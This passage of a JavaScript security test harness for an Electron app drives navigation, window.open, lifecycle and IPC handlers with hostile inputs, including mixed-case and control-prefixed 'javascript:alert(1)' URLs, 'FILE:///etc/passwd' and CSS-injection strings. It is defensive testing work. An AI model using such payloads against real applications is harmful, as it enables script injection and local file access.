    // Encoded and mixed-case spellings of the schemes above.
    'JaVaScRiPt:alert(1)', 'FILE:///etc/passwd', '\u0001javascript:alert(1)',
    ' javascript:alert(1)',
    // RAW vs PARSED. `new URL()` normalises: it strips leading/trailing
    // whitespace and control characters, lowercases the scheme and host, and
    // percent-encodes the rest. A gate that VALIDATES `parsed` but hands the
    // OS the RAW string validates one value and acts on another — so these
    // must arrive at shell.openExternal in their normalised form or not at all.
    '  https://ok.example/x  ', '\thttps://ok.example/x\n',
    'https://OK.EXAMPLE/x', 'https://ok.example/x\u0000',
    'https://ok.example/a\u0001b'];
  const windowOpenVerdicts = [];
  const navigationPrevented = [];
  const framePrevented = [];
  // Electron passes different argument shapes for these two events, and has
  // changed them across versions: `will-navigate` gets `(event, url)`, while
  // `will-frame-navigate` gets ONE Event carrying `url` (>= 22) or
  // `(event, details)` on other shapes. A handler that reads only one shape and
  // is driven only with that same shape is never actually tested, so drive all
  // three against both events. `documented` marks the shapes Electron really
  // sends for that event — only those can carry the must-ALLOW control below,
  // because failing closed on a shape you never receive is not a defect.
  const SHAPES = {
    'event.url': (url, mark) => [{ preventDefault: mark, url }],
    '(event, details.url)': (url, mark) => [{ preventDefault: mark }, { url }],
    '(event, url)': (url, mark) => [{ preventDefault: mark }, url],
  };
  const EVENTS = [
    ['will-navigate', willNavigateHandlers, navigationPrevented, ['(event, url)']],
    ['will-frame-navigate', willFrameNavigateHandlers, framePrevented,
      ['event.url', '(event, details.url)']],
  ];
  // Drive one URL through every navigation door, in every argument shape
  // Electron really sends for that door, recording [where, prevented,
  // handedToOS]. Used for the in-app control and for the port-move probe.
  // GATE REVIEW #7 F1, reproduced: swallowing the exception recorded a throwing
  // handler as `[prevented=false, handedToOS=false]` — byte-identical to a
  // correct in-app navigation, so `throw` inside keepApp's app-origin branch
  // passed every control. The throw is now RECORDED and asserted on.
  // F1 also: a handler that defers its OS call (`queueMicrotask(() =>
  // shell.openExternal(...))`) lands after the synchronous
  // `openedUrls.length` snapshot. `settleInApp` re-attributes a hand-off
  // that has arrived by `out()` to the row that caused it. It does not await:
  // the runner's async lifetime ends at `out()`, so a timer fired later is a
  // separate harness limitation, not a counted deferred hand-off.
  // Rows are [where, prevented, handedToOS, threw]. Both of the extra fields
  // come from gate review #7, each reproduced against a product mutant first:
  //
  //  F1 EXCEPTION BLINDNESS. `catch {}` recorded a THROWING handler as
  //     [prevented=false, handedToOS=false] — byte-identical to a correct
  //     in-app navigation. `throw` inside keepInApp's app-origin branch
  //     passed every control. The message is recorded and asserted on.
  //
  //  F1 DEFERRED EFFECTS. A handler that defers its OS call
  //     (`queueMicrotask(() => shell.openExternal(url))`) lands after a
  //     synchronous openedUrls snapshot. Each row is therefore re-read at
  //     out() time by `settleInApp`, which attributes anything that arrived
  //     while THIS row was the most recent one driven.
  const inAppRows = [];
  const driveInApp = (url, sink) => {
    for (const [event, handlers, , documented] of EVENTS) {
      for (const shape of documented) {
        for (const cb of handlers) {
          let prevented = false;
          let threw = null;
          const before = openedUrls.length;
          try { cb(...SHAPES[shape](url, () => { prevented = true; })); }
          catch (e) { threw = String((e && e.message) || e).slice(0, 120); }
          const row = [`${event} [${shape}]`, prevented, openedUrls.length > before, threw];
          row.__before = before;
          sink.push(row);
          inAppRows.push(row);
        }
      }
    }
  };
  // Rows are driven in order and openedUrls only grows, so "anything appeared
  // at or after my snapshot, and before the NEXT row's snapshot" attributes a
  // late hand-off to the row that caused it. Called once, just before out().
  const settleInApp = () => {
    for (let i = 0; i < inAppRows.length; i++) {
      const start = inAppRows[i].__before;
      const end = i + 1 < inAppRows.length ? inAppRows[i + 1].__before : openedUrls.length;
      if (openedUrls.length > start && end > start) inAppRows[i][2] = true;
    }
  };
  for (const url of HOSTILE) {
    if (typeof capturedWindowOpenHandler === 'function') {
      let v; try { v = capturedWindowOpenHandler({ url }); } catch { v = 'threw'; }
      windowOpenVerdicts.push([url, v && v.action ? v.action : String(v)]);
    }
    for (const [shape, build] of Object.entries(SHAPES)) {
      for (const [, handlers, sink] of EVENTS) {
        for (const cb of handlers) {
          let prevented = false;
          try { cb(...build(url, () => { prevented = true; })); } catch { /* ignore */ }
          sink.push([`${url} [${shape}]`, prevented]);
        }
      }
    }
  }

  // Navigation and window.open are not the only doors to the OS. Electron
  // delivers URLs to the app through LIFECYCLE events too — `open-url` (a
  // registered scheme or a clicked link handed to the app by macOS),
  // `second-instance` (argv from a relaunch). A handler there that forwards to
  // shell.openExternal is the same capability with none of the scheme policy,
  // and nothing above would ever drive it. Fire every registered app event with
  // hostile payloads in the shapes Electron uses; openedUrls records the result.
  for (const url of HOSTILE) {
    for (const event of Object.keys(onHandlers)) {
      if (event === 'ready' || event === 'will-quit' || event === 'before-quit') continue;
      for (const args of [[{ preventDefault() {} }, url], [{ preventDefault() {} }, [url], '/tmp'],
        [{ preventDefault() {} }, { url }]]) {
        try { for (const cb of onHandlers[event]) cb(...args); } catch { /* handler's own error */ }
      }
    }
  }
  const lifecycleEventsDriven = Object.keys(onHandlers)
    .filter((e) => !['ready', 'will-quit', 'before-quit'].includes(e));

  // Drive every registered ipcMain handler with renderer-controlled garbage.
  // These run in the MAIN process with full Node privileges, and their only
  // input is whatever the page sends. Record what each one does with values it
  // was not designed for — `setBackgroundColor` reaches a native window API.
  const ipcAccepted = [];
  const ipcThrew = [];
  // '#001122' is the POSITIVE CONTROL and must be first: with only hostile
  // payloads, "nothing was accepted" is indistinguishable from "the handler was
  // never reached", which is exactly what happened when BrowserWindow
  // .fromWebContents returned null and `if (win)` was always false.
  const IPC_PAYLOADS = ['#001122',
    undefined, null, 0, 1, true, '', '#fff', '#zzzzzz', '#0011223',
    'red', 'rgb(0,0,0)', 'javascript:alert(1)', '#001122; background: url(x)',
    '\u0000#001122', '#001122\n', ' #001122', '#001122'.repeat(5000), {}, [], () => {},
    { toString: () => '#001122' }, Symbol.iterator];
  for (const [channel, handlers] of Object.entries(fakeIpcMain._h)) {
    for (const fn of handlers) {
      for (const payload of IPC_PAYLOADS) {
        const before = windowBackgroundColors.length;
        try {
          fn({ sender: mainContents, frameId: 1, processId: 1 }, payload);
          if (windowBackgroundColors.length > before) {
            ipcAccepted.push([channel, String(windowBackgroundColors[windowBackgroundColors.length - 1])]);
          }
        } catch (e) { ipcThrew.push([channel, String(e && e.message).slice(0, 80)]); }
      }
    }
  }

  // THE SENDER, not the payload — BLUE-LOOP-DESKTOP-22 sweep 43's new angle.
  // Every payload above is delivered with the SAME event
  // (`{ sender: mainContents }`), so half the handler had never been driven:
  //     const win = BrowserWindow.fromWebContents(event.sender);
  //     if (win) win.setBackgroundColor(color);
  // `event.sender` is attacker-influenced in a way the payload is not — any
  // webContents the app ever creates (an iframe's, a popup's, a devtools
  // contents, one whose window was destroyed between send and receive)
  // arrives on the SAME channel. A sender that resolves to no window must be
  // a silent no-op: a throw inside an ipcMain listener is an unhandled
  // main-process error, and repainting SOME window for an orphan sender is
  // worse. `fromWebContents` here resolves the owning window exactly as
  // Electron's does, and returns null when nothing owns the contents.
  const senderProbes = [];
  {
    const fn = (fakeIpcMain._h['set-background-color'] || [])[0];
    const orphan = new FakeWebContents();  // owned by no window
    const cases = [
      ['the main window\'s own sender (CONTROL)', { sender: mainContents }, true],
      ['an ORPHAN webContents (no owning window)', { sender: orphan }, false],
      ['sender = null', { sender: null }, false],
      ['sender = undefined', { sender: undefined }, false],
      ['no sender key at all', {}, false],
      ['sender = a plain object', { sender: { nope: true } }, false],
    ];
    for (const [label, event, shouldApply] of cases) {
      const before = windowBackgroundColors.length;
      let threw = null;
      try { if (fn) fn(event, '#123456'); }
      catch (e) { threw = String((e && e.message) || e).slice(0, 100); }
      senderProbes.push([label, windowBackgroundColors.length > before, threw, shouldApply]);
    }
  }

  // THE PORT MOVE — BLUE-LOOP-DESKTOP-22, sweep 40, reproduced before it was
  // fixed. server.ts retries port+1 forever on EADDRINUSE under IS_ELECTRON
  // and reports the port it FINALLY bound through `onExpressListening`. That
  // handler has two arms, and only one of them creates a window:
  //     if (app.isReady() && !mainWindow) createWindow(port);
  //     else if (mainWindow)              <move the existing window>
  // The SECOND arm is the one at issue (the 800ms slow-boot fallback already
  // opened a window — exactly the case where the server was slow BECAUSE it
  // was walking the port range), and it is reachable only while `mainWindow`
  // is still live.
  //
  // So this MUST run before the window-event loop below, which fires
  // 'closed' and sets `mainWindow = null` — with it after, the call took the
  // createWindow arm instead, which assigns the origin on any tree and the
  // check passed with the fix reverted. Measured, and the reason this block
  // sits here rather than beside the other navigation probes.
  const MOVED_PORT = 14399;
  const ORIGINAL_PORT = Number(new URL(loadedUrls[0] || 'http://127.0.0.1:14322').port);
  // `windowOptions` gets one entry per BrowserWindow constructed, so this
  // counts windows: it is what distinguishes the arm being tested (move an
  // existing window) from the OTHER arm (create a new one, which assigns the
  // origin on any tree and would make these checks pass with the fix
  // reverted — measured, that is exactly what happened at first).
  const windowsBeforeMove = windowOptions.length;
  let portMoveDriven = false;
  if (typeof globalThis.onExpressListening === 'function') {
    try { globalThis.onExpressListening(MOVED_PORT); portMoveDriven = true; } catch { /* reported by the test */ }
  }
  const windowsAfterMove = windowOptions.length;
  // What the window was actually pointed at by the move — the test asserts it
  // is the NEW port, or "the allowlist followed the window" would be a claim
  // about a window that never moved.
  const loadedUrlsAtMove = [...loadedUrls];
  const inAppAfterMove = [];
  const staleAfterMove = [];
  driveInApp(`http://127.0.0.1:${MOVED_PORT}/some/in-app/route`, inAppAfterMove);
  driveInApp(`http://127.0.0.1:${ORIGINAL_PORT}/some/in-app/route`, staleAfterMove);
  // Move it BACK, so the in-app control further down still describes the
  // origin the app is on (and so the allowlist is shown to follow in both
  // directions, not merely to have been widened once).
  if (portMoveDriven) { try { globalThis.onExpressListening(ORIGINAL_PORT); } catch { /* ignore */ } }

  // Window events too — the fullscreen handlers call executeJavaScript, which
  // runs code IN THE RENDERER from the main process, to one side of every
  // policy this file checks. Fire them so whatever they inject is recorded.
  for (const event of Object.keys(windowEvents)) {
    for (const cb of windowEvents[event]) {
      try { cb({ preventDefault() {} }); } catch { /* handler's own error */ }
    }
  }

  // THE CONTROL. Every assertion above is satisfied by a handler that calls
  // preventDefault() unconditionally and never looks at the URL — which would
  // also break in-app navigation completely and hand the OS nothing to open.
  // The app's own origin must pass THROUGH: not prevented, and not shipped to
  // shell.openExternal. This is what forces the handler to actually parse.
  const inApp = [];
  // Derived from what the app ACTUALLY loaded, not hardcoded: with a literal
  // port this control fails whenever loadURL changes for any reason, and the
  // failure names the navigation policy instead of the real cause. The loadURL
  // assertion in the test pins the origin itself.
  const IN_APP_URL = `${(loadedUrls[0] || 'http://127.0.0.1:14322').replace(/\/$/, '')}/some/in-app/route`;
  driveInApp(IN_APP_URL, inApp);

  setTimeout(() => { settleInApp(); return out({
    openedUrls,
    windowOpenVerdicts,
    navigationPrevented,
    framePrevented,
    inApp,
    appOriginProbed: IN_APP_URL,
    portMoveDriven,
    movedPort: MOVED_PORT,
    originalPort: ORIGINAL_PORT,
    windowsBeforeMove,
    windowsAfterMove,
    loadedUrlsAtMove,
    inAppAfterMove,
    staleAfterMove,
    windowOpenHandlerInstalled: typeof capturedWindowOpenHandler === 'function',
    willNavigateHandlerCount: willNavigateHandlers.length,
    willFrameNavigateHandlerCount: willFrameNavigateHandlers.length,
    lifecycleEventsDriven,
    windowEventsDriven: Object.keys(windowEvents),
    ipcChannels,
    ipcAccepted,
    ipcThrew,
    senderProbes,
    windowBackgroundColors,
    injectedScripts,
    injectedCss,
    loadedUrls,
    backendLoaded,
    deferredMs: 300,
  }); }, 300);
}
